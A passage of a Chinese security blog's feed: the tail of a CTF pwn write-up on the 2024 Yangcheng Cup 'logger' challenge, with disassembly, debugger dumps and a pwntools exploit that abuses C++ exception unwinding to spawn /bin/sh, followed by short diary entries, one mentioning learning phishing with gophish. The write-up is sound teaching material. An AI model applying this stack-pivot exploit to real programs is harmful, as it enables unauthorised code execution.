___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C20                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000401</span>C23                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401</span>C26                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B loc_401C2B:                             ; CODE XREF: sub_401B8F+<span class="number">83</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000401</span>C2F                 leave</span><br><span class="line">.text:<span class="number">0000000000401</span>C30                 retn</span><br><span class="line">.text:<span class="number">0000000000401</span>C30 ; &#125; <span class="comment">// starts at 401B8F</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C30 sub_401B8F      endp</span><br></pre></td></tr></table></figure><p>可以看到参数是rbp-0x18处的数据，但是在0x401BE1处程序将rax赋给了rbp-0x18，所以要动调看看赋了什么。动调发现是0x4040a0，所以我们需要在这个地方写入binsh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/32gx 0x404020</span></span><br><span class="line">0x404020:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404030:       0x3b68732f6e69622f      0x00000000004040a0</span><br><span class="line">0x404040:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404050:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404060:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404070:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404080:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404090:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x4040a0:       0x0068732f6e69622f      0x00776f6c6672000a</span><br><span class="line">0x4040b0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4040c0:       0x00007fa631b00848      0x00007fa631b006f8</span><br><span class="line">0x4040d0:       0x00007fa6319908c0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>原本0x4040a0是<code>Buffer Overflow</code>这个字符串，但是利用trace在末尾加截断符的性质可以将这个字符串覆写为binsh。</p><p>至于rbp劫持了为多少，只要rbp-0x18不要超出data段就行了。</p><p>对了，这里一样也是不用顾虑canary的问题，因为抛出异常之后，<code>__stack_chk_fail</code>不会被执行到。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;details here:&quot;</span>, content)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;records?&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;plz: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    trace(<span class="string">b&#x27;/bin/sh;&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">trace(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x404020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x401BE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">warn(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*(<span class="number">0x70</span>//<span class="number">8</span>)+p64(<span class="number">0x404050</span>)+p64(<span class="number">0x401bc7</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">从2024羊城杯logger题目引起的cpp异常处理机制学习</summary>
    
    
    
    <category term="cpp异常处理机制" scheme="https://c-lby.top/categories/cpp%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="cpp异常处理机制" scheme="https://c-lby.top/tags/cpp%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-25</title>
    <link href="https://c-lby.top/2024/diary/24-8-25/"/>
    <id>https://c-lby.top/2024/diary/24-8-25/</id>
    <published>2024-08-25T04:54:02.000Z</published>
    <updated>2024-08-25T05:39:48.445Z</updated>
    
    <content type="html"><![CDATA[<p>结营，证书+2，知识+n</p><p>准备一下蓝队的知识吧</p><p>算了学<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">protobuf</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;结营，证书+2，知识+n&lt;/p&gt;
&lt;p&gt;准备一下蓝队的知识吧&lt;/p&gt;
&lt;p&gt;算了学&lt;a href=&quot;https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA&quot;&gt;protobuf&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-24</title>
    <link href="https://c-lby.top/2024/diary/24-8-24/"/>
    <id>https://c-lby.top/2024/diary/24-8-24/</id>
    <published>2024-08-24T04:53:57.000Z</published>
    <updated>2024-08-25T04:56:15.507Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mlm.lingyiwanwu.com/">机器语言大模型MLM</a></p><p>来自高傲的清华</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://mlm.lingyiwanwu.com/&quot;&gt;机器语言大模型MLM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来自高傲的清华&lt;/p&gt;
</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-23</title>
    <link href="https://c-lby.top/2024/diary/24-8-23/"/>
    <id>https://c-lby.top/2024/diary/24-8-23/</id>
    <published>2024-08-23T11:28:37.000Z</published>
    <updated>2024-08-23T11:56:21.017Z</updated>
    
    <content type="html"><![CDATA[<p>今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。</p><p>可能老了，不喜欢太花里胡哨的东西了（</p><p>今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。</p><p>今天似乎过得异常地轻松，比起前几天高强度的学习和考核。总算可以休息一会了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。&lt;/p&gt;
&lt;p&gt;可能老了，不喜欢太花里胡哨的东西了（&lt;/p&gt;
&lt;p&gt;今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
</feed>
